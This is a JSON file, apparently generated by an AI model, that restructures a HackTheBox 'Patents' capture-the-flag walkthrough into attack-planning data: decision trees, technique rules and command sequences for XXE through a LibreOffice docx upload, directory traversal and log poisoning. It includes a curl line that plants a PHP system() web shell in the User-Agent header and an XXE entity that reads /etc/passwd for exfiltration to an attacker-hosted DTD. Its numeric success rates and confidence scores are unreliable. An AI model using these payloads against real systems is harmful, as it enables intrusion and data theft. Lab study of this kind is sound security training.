@@ -1,0 +1,881 @@
+{
+  "writeup_id": "Htb_Patents",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_xxe_docker_escape",
+    "primary_services": [
+      "http",
+      "ssh",
+      "custom_service"
+    ],
+    "port_signature": "22+80+8888",
+    "service_combination": "ssh+apache+custom_tcp",
+    "os_family": "linux",
+    "environment_type": "containerized_web_application",
+    "entry_vector": "xxe_injection",
+    "privilege_path": "xxe_to_lfi_to_container_root_to_host_root",
+    "attack_complexity": "hard",
+    "estimated_time": "4-6 hours",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "libreoffice_document_conversion",
+      "docx_to_pdf_processing",
+      "custom_tcp_service_8888",
+      "docker_container_web_app"
+    ],
+    "environmental_clues": [
+      "document_upload_functionality",
+      "libreoffice_backend_processing",
+      "unknown_tcp_service",
+      "ubuntu_18_04_apache"
+    ],
+    "similar_scenarios": [
+      "arkham_htb_medium",
+      "json_htb_medium"
+    ],
+    "unique_aspects": [
+      "xxe_in_libreoffice_conversion",
+      "log_poisoning_via_directory_traversal",
+      "custom_binary_reverse_engineering",
+      "multi_stage_container_escape"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "XXE_via_LibreOffice",
+        "success_reason": "LibreOffice 6.0 processing docx files vulnerable to XXE injection",
+        "prerequisite_indicators": [
+          "document_conversion_service",
+          "libreoffice_backend_identified",
+          "docx_file_upload_accepted"
+        ],
+        "recognition_patterns": [
+          "PDF metadata shows LibreOffice producer",
+          "docx to PDF conversion functionality",
+          "server-side document processing"
+        ],
+        "failure_modes": [
+          "updated_libreoffice_version",
+          "xml_entity_processing_disabled",
+          "input_sanitization_implemented"
+        ],
+        "environmental_factors": [
+          "legacy_libreoffice_version",
+          "default_xml_processing_config",
+          "automated_document_conversion"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "30-60 minutes"
+      },
+      {
+        "technique": "Directory_Traversal_Log_Poisoning",
+        "success_reason": "Directory traversal vulnerability combined with log file access and PHP execution",
+        "prerequisite_indicators": [
+          "directory_traversal_vulnerability",
+          "web_server_logs_accessible",
+          "php_execution_in_logs"
+        ],
+        "recognition_patterns": [
+          "path traversal in URL parameters",
+          "access to /var/log/apache2/access.log",
+          "user-agent injection possible"
+        ],
+        "failure_modes": [
+          "logs_not_accessible",
+          "input_filtering_active",
+          "php_execution_disabled"
+        ],
+        "environmental_factors": [
+          "apache_default_log_location",
+          "insufficient_path_validation",
+          "php_code_execution_enabled"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "20-45 minutes"
+      },
+      {
+        "technique": "Custom_Service_Binary_Exploitation",
+        "success_reason": "Custom service on port 8888 with exploitable buffer overflow or logic flaw",
+        "prerequisite_indicators": [
+          "custom_service_running",
+          "binary_source_code_available",
+          "reverse_engineering_possible"
+        ],
+        "recognition_patterns": [
+          "unknown service on non-standard port",
+          "custom protocol responses",
+          "git repository with source code"
+        ],
+        "failure_modes": [
+          "modern_exploit_mitigations",
+          "input_validation_implemented",
+          "service_sandboxing"
+        ],
+        "environmental_factors": [
+          "custom_developed_service",
+          "minimal_security_hardening",
+          "development_artifacts_exposed"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "2-4 hours"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "LibreOffice 6.0 XXE vulnerability",
+        "discovery_method": "PDF metadata analysis with exiftool",
+        "why_critical": "Enabled configuration file disclosure leading to hidden functionality",
+        "how_to_recognize": [
+          "PDF producer field shows LibreOffice version",
+          "document conversion service present",
+          "known vulnerable LibreOffice version"
+        ],
+        "follow_up_actions": [
+          "craft_xxe_payload_in_docx",
+          "extract_configuration_files",
+          "identify_hidden_endpoints"
+        ]
+      },
+      {
+        "discovery": "Hidden patents functionality via UpdateDetails",
+        "discovery_method": "Directory enumeration with large wordlists",
+        "why_critical": "Revealed additional attack surface with directory traversal",
+        "how_to_recognize": [
+          "version notes mentioning hidden features",
+          "references to experimental functionality",
+          "developer comments about vulnerabilities"
+        ],
+        "follow_up_actions": [
+          "enumerate_hidden_directories",
+          "test_directory_traversal",
+          "analyze_mentioned_vulnerabilities"
+        ]
+      },
+      {
+        "discovery": "Git repository with service source code",
+        "discovery_method": "File system enumeration after container compromise",
+        "why_critical": "Provided source code for custom service exploitation",
+        "how_to_recognize": [
+          "git directories in web root",
+          "source code files for custom services",
+          "development artifacts in production"
+        ],
+        "follow_up_actions": [
+          "analyze_source_code",
+          "identify_vulnerabilities",
+          "develop_custom_exploit"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_container_user",
+        "escalation_method": "Password_in_Process_List",
+        "why_possible": "Root password exposed in running process arguments",
+        "recognition_signs": [
+          "ps_aux_shows_credentials",
+          "process_arguments_contain_passwords",
+          "insufficient_credential_protection"
+        ],
+        "exploitation_path": "Log Poisoning → Web Shell → Process Enumeration → Root Password"
+      },
+      {
+        "privilege_level": "container_root",
+        "escalation_method": "Custom_Service_Exploitation",
+        "why_possible": "Access to custom service client and source code for vulnerability analysis",
+        "recognition_signs": [
+          "custom_service_communication_tools",
+          "source_code_repository_access",
+          "exploitable_service_vulnerabilities"
+        ],
+        "exploitation_path": "Container Root → Service Analysis → Custom Exploit → Host Root"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80,8888 open on Linux host with web service and unknown service",
+        "decision": "Enumerate web application first, then investigate unknown service",
+        "reasoning": "Web applications typically have larger attack surface and faster exploitation paths",
+        "confidence": 0.85,
+        "alternatives": [
+          {
+            "option": "investigate_unknown_service",
+            "when": "if web enumeration fails"
+          },
+          {
+            "option": "ssh_enumeration",
+            "when": "if credentials found"
+          }
+        ],
+        "success_indicators": [
+          "web_application_functionality_discovered",
+          "file_upload_capability_found",
+          "directory_structure_mapped"
+        ],
+        "next_decision": "analyze_file_upload_functionality"
+      },
+      {
+        "step": 2,
+        "situation": "Found docx to PDF conversion service using LibreOffice",
+        "decision": "Test for XXE injection in document processing",
+        "reasoning": "LibreOffice document conversion often processes XML entities, high probability of XXE",
+        "confidence": 0.9,
+        "prerequisites": [
+          "document_upload_functionality",
+          "conversion_service_identified"
+        ],
+        "success_indicators": [
+          "file_read_via_xxe",
+          "configuration_files_leaked"
+        ],
+        "failure_fallbacks": [
+          "directory_traversal_testing",
+          "parameter_fuzzing"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "XXE successful, configuration file leaked revealing hidden functionality",
+        "decision": "Explore newly discovered endpoints for directory traversal",
+        "reasoning": "Configuration leak often reveals additional attack surface",
+        "confidence": 0.8,
+        "prerequisites": [
+          "configuration_file_contents",
+          "new_endpoints_discovered"
+        ],
+        "success_indicators": [
+          "directory_traversal_confirmed",
+          "log_files_accessible"
+        ],
+        "failure_fallbacks": [
+          "parameter_pollution",
+          "authentication_bypass"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Directory traversal found with log file access",
+        "decision": "Attempt log poisoning for code execution",
+        "reasoning": "Log poisoning is reliable method when log files are writable and readable",
+        "confidence": 0.75,
+        "prerequisites": [
+          "log_file_access",
+          "directory_traversal_working"
+        ],
+        "success_indicators": [
+          "code_execution_achieved",
+          "reverse_shell_obtained"
+        ],
+        "failure_fallbacks": [
+          "file_inclusion_attacks",
+          "configuration_manipulation"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_xxe_succeeds": {
+        "action": "extract_configuration_and_explore_hidden_paths",
+        "tools": [
+          "custom_docx_with_xxe_payload",
+          "burp_suite"
+        ],
+        "next_phase": "directory_traversal_exploitation"
+      },
+      "if_directory_traversal_found": {
+        "action": "attempt_log_poisoning",
+        "alternatives": [
+          "access_log_poisoning",
+          "error_log_poisoning",
+          "application_log_poisoning"
+        ],
+        "decision_criteria": "based_on_accessible_log_files"
+      },
+      "if_shell_obtained": {
+        "action": "container_privilege_escalation",
+        "purpose": "escalate_within_docker_container",
+        "tools": [
+          "process_enumeration",
+          "credential_hunting"
+        ]
+      },
+      "if_container_root_achieved": {
+        "action": "investigate_host_communication",
+        "purpose": "break_out_of_container",
+        "tools": [
+          "network_analysis",
+          "application_reverse_engineering"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_xxe_on_document_processing_services",
+        "reasoning": "high_success_rate_especially_with_libreoffice_conversion",
+        "applicability": "document_upload_and_conversion_functionality"
+      },
+      {
+        "rule": "check_version_info_and_changelogs_for_vulnerability_hints",
+        "reasoning": "developers_often_leak_vulnerability_information_in_release_notes",
+        "applicability": "any_application_with_accessible_version_information"
+      },
+      {
+        "rule": "combine_directory_traversal_with_log_poisoning",
+        "reasoning": "reliable_code_execution_method_when_both_vulnerabilities_present",
+        "applicability": "web_applications_with_accessible_log_files"
+      },
+      {
+        "rule": "investigate_custom_services_after_initial_foothold",
+        "reasoning": "unknown_services_often_contain_privilege_escalation_paths",
+        "applicability": "systems_with_custom_network_services"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "XXE_LibreOffice_Docx",
+        "mitre_id": "T1203",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "document_upload_functionality",
+          "libreoffice_conversion_service",
+          "docx_file_processing",
+          "xml_parsing_enabled"
+        ],
+        "success_indicators": [
+          "pdf_output_generated",
+          "libreoffice_metadata_in_output",
+          "file_conversion_endpoint_exists",
+          "document_processing_delay"
+        ],
+        "incompatible_with": [
+          "xml_external_entities_disabled",
+          "file_upload_restrictions",
+          "sandboxed_conversion_environment"
+        ],
+        "confidence_boosters": [
+          "libreoffice_version_in_metadata",
+          "convert_php_endpoint_exists",
+          "uploads_directory_accessible",
+          "output_directory_accessible"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Directory_Traversal_Log_Poisoning",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "file_inclusion_vulnerability",
+          "log_files_accessible",
+          "user_controlled_input_logged"
+        ],
+        "success_indicators": [
+          "directory_traversal_successful",
+          "log_file_contents_displayed",
+          "user_agent_reflected_in_logs",
+          "php_code_execution_achieved"
+        ],
+        "incompatible_with": [
+          "input_sanitization_enabled",
+          "log_files_not_accessible",
+          "chroot_environment",
+          "strict_file_permissions"
+        ],
+        "confidence_boosters": [
+          "apache_access_logs_standard_location",
+          "php_application_detected",
+          "error_messages_reveal_paths",
+          "file_parameter_in_urls"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Custom_Service_Binary_Analysis",
+        "mitre_id": "T1068",
+        "required_services": [
+          "unknown",
+          "custom"
+        ],
+        "required_ports": [
+          8888
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "custom_service_running",
+          "binary_source_code_accessible",
+          "git_repository_present",
+          "reverse_engineering_possible"
+        ],
+        "success_indicators": [
+          "service_responds_to_probes",
+          "custom_protocol_identified",
+          "source_code_found",
+          "vulnerability_in_binary"
+        ],
+        "incompatible_with": [
+          "encrypted_communication",
+          "source_code_unavailable",
+          "modern_exploit_mitigations",
+          "service_authentication_required"
+        ],
+        "confidence_boosters": [
+          "development_environment_indicators",
+          "git_directory_accessible",
+          "debug_symbols_present",
+          "custom_error_messages"
+        ],
+        "typical_success_rate": 0.45,
+        "estimated_time": "60-180 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "document_processing_service": {
+        "port_indicators": [
+          80,
+          443,
+          8080
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "endpoint_indicators": [
+          "/upload",
+          "/convert",
+          "/output"
+        ],
+        "technology_indicators": [
+          "libreoffice",
+          "document conversion",
+          "pdf generation"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "apache",
+          "php"
+        ],
+        "banner_indicators": [
+          "Apache/2.4.29",
+          "Ubuntu"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "custom_service": {
+        "port_indicators": [
+          8888
+        ],
+        "service_indicators": [
+          "unknown",
+          "sun-answerbook"
+        ],
+        "response_indicators": [
+          "LFM 400 BAD REQUEST",
+          "custom protocol"
+        ],
+        "confidence_threshold": 0.7
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "xxe_libreoffice_docx",
+          "when": "document_upload_and_libreoffice_detected",
+          "reason": "high_impact_file_disclosure_possible"
+        },
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "reveals_additional_attack_surface"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "directory_traversal_log_poisoning",
+          "when": "php_application_and_file_inclusion_detected",
+          "reason": "reliable_rce_method_if_logs_accessible"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "custom_service_analysis",
+          "when": "unknown_service_detected",
+          "reason": "requires_significant_reverse_engineering_effort"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "XXE via LibreOffice Document Processing",
+        "mitre_id": "T1203",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "LibreOffice Writer",
+            "command_template": "Create .docx with customXML folder containing malicious XML",
+            "actual_command": "Manual creation of item1.xml with XXE payload in customXML folder",
+            "output_pattern": "Base64 encoded file contents in HTTP request",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "Python HTTP Server",
+            "command_template": "python3 -m http.server {port}",
+            "actual_command": "python3 -m http.server 80",
+            "success_factors": [
+              "target_can_reach_attacker_server",
+              "xxe_payload_properly_formatted"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "document_upload_functionality",
+          "libreoffice_processing_backend",
+          "entity_parsing_enabled",
+          "outbound_network_access_from_target"
+        ],
+        "success_indicators": [
+          "dtd_file_requested_from_attacker_server",
+          "exfiltration_request_with_base64_data",
+          "file_contents_successfully_decoded"
+        ],
+        "common_failures": [
+          "entity_parsing_disabled",
+          "network_restrictions_block_outbound",
+          "malformed_xml_structure",
+          "file_permissions_prevent_access"
+        ],
+        "follow_up_techniques": [
+          "configuration_file_enumeration",
+          "directory_traversal",
+          "log_poisoning"
+        ],
+        "time_investment": "30-60 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Directory Traversal via Web Application",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "post_exploitation",
+        "tools_used": [
+          {
+            "name": "gobuster",
+            "command_template": "gobuster dir -u {url} -w {wordlist} -x {extensions}",
+            "actual_command": "gobuster dir -u http://10.10.10.173/release -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt",
+            "output_pattern": "Status: 200 responses for hidden directories",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "web_application_accessible",
+          "directory_traversal_vulnerability_present",
+          "insufficient_input_validation"
+        ],
+        "success_indicators": [
+          "access_to_files_outside_web_root",
+          "configuration_files_readable",
+          "system_information_disclosure"
+        ],
+        "common_failures": [
+          "path_traversal_filtered",
+          "insufficient_privileges",
+          "files_not_readable_by_web_user"
+        ],
+        "follow_up_techniques": [
+          "log_poisoning",
+          "credential_harvesting",
+          "service_enumeration"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Log Poisoning for Code Execution",
+        "mitre_id": "T1055",
+        "category": "execution",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -H 'User-Agent: <?php system($_GET[\"cmd\"]); ?>' {target_url}",
+            "actual_command": "curl -H 'User-Agent: <?php system($_GET[\"cmd\"]); ?>' http://10.10.10.173/",
+            "output_pattern": "Command execution output in log file",
+            "effectiveness_rating": 4,
+            "reliability": 0.8
+          }
+        ],
+        "prerequisites": [
+          "log_file_accessible_via_directory_traversal",
+          "log_file_includes_user_controlled_data",
+          "log_file_processed_by_php_interpreter"
+        ],
+        "success_indicators": [
+          "php_code_executed_successfully",
+          "command_output_visible_in_response",
+          "reverse_shell_connection_established"
+        ],
+        "common_failures": [
+          "log_rotation_clears_payload",
+          "insufficient_privileges_for_execution",
+          "log_format_breaks_php_syntax"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "privilege_escalation",
+          "container_escape"
+        ],
+        "time_investment": "20-40 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "gobuster",
+        "use_case": "directory_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "dirbuster",
+          "ffuf",
+          "wfuzz"
+        ],
+        "best_practices": [
+          "use_multiple_wordlists_for_comprehensive_coverage",
+          "adjust_thread_count_based_on_target_stability",
+          "filter_out_noise_status_codes"
+        ]
+      },
+      {
+        "tool": "exiftool",
+        "use_case": "document_metadata_analysis",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "document_analysis",
+          "information_gathering"
+        ],
+        "alternatives": [
+          "file_command",
+          "strings"
+        ],
+        "best_practices": [
+          "analyze_all_uploaded_documents",
+          "look_for_software_versions_and_creation_details",
+          "check_for_embedded_paths_and_usernames"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "xxe_file_exfiltration_via_docx",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Create evil.dtd with: <!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">",
+            "purpose": "Define external entity for file reading",
+            "expected_output": "DTD file ready for hosting"
+          },
+          {
+            "step": 2,
+            "command": "python3 -m http.server 80",
+            "purpose": "Host DTD file for XXE payload",
+            "expected_output": "HTTP server listening on port 80"
+          },
+          {
+            "step": 3,
+            "command": "Create .docx with customXML/item1.xml containing XXE payload",
+            "purpose": "Embed XXE attack in document structure",
+            "expected_output": "Malicious document ready for upload"
+          },
+          {
+            "step": 4,
+            "command": "Upload document to target application",
+            "purpose": "Trigger XXE processing",
+            "expected_output": "Base64 encoded file contents in HTTP request"
+          }
+        ],
+        "success_rate": 0.75,
+        "typical_duration": "30-60 minutes"
+      },
+      {
+        "sequence_name": "directory_traversal_to_log_poisoning",
+        "steps": [
+          {
+            "step": 1,
+            "command": "gobuster dir -u http://target/release -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt",
+            "purpose": "Discover hidden directories and files",
+            "expected_output": "List of accessible paths including UpdateDetails"
+          },
+          {
+            "step": 2,
+            "command": "curl -H 'User-Agent: <?php system($_GET[\"cmd\"]); ?>' http://target/",
+            "purpose": "Poison access logs with PHP code",
+            "expected_output": "PHP payload written to access log"
+          },
+          {
+            "step": 3,
+            "command": "Access log file via directory traversal with cmd parameter",
+            "purpose": "Execute commands through poisoned log",
+            "expected_output": "Command execution output"
+          }
+        ],
+        "success_rate": 0.7,
+        "typical_duration": "45-90 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Patents",
+      "difficulty": "Hard",
+      "os": "Linux",
+      "platform": "HackTheBox",
+      "release_date": "2020-01-18",
+      "author": "gbyolo",
+      "estimated_time": "4-6 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "high",
+      "skill_level_required": "advanced",
+      "primary_attack_vectors": [
+        "xxe",
+        "directory_traversal",
+        "log_poisoning",
+        "binary_exploitation"
+      ],
+      "key_vulnerabilities": [
+        "xxe_in_libreoffice",
+        "directory_traversal",
+        "custom_service_exploit"
+      ],
+      "environment_type": "web_application_with_custom_services",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "xxe_exploitation",
+        "log_poisoning",
+        "docker_escape",
+        "binary_reverse_engineering"
+      ],
+      "prerequisite_knowledge": [
+        "web_exploitation",
+        "xxe_fundamentals",
+        "binary_analysis",
+        "docker_concepts"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "xxe",
+        "directory_traversal",
+        "binary_exploitation",
+        "container_escape"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation",
+        "lateral_movement"
+      ],
+      "defensive_lessons": [
+        "disable_external_entities",
+        "input_validation",
+        "container_hardening",
+        "secure_coding"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Arkham",
+        "Craft",
+        "Player"
+      ],
+      "similarity_reasons": [
+        "xxe_exploitation",
+        "complex_attack_chain",
+        "custom_applications"
+      ],
+      "unique_aspects": [
+        "libreoffice_xxe",
+        "php_filter_chaining",
+        "git_repo_analysis"
+      ],
+      "difficulty_factors": [
+        "multiple_exploitation_stages",
+        "binary_reverse_engineering",
+        "complex_attack_chain"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T16:13:10.386652",
+    "original_file": "0xdf_writeups/Htb Patents.md",
+    "content_length": 80164,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
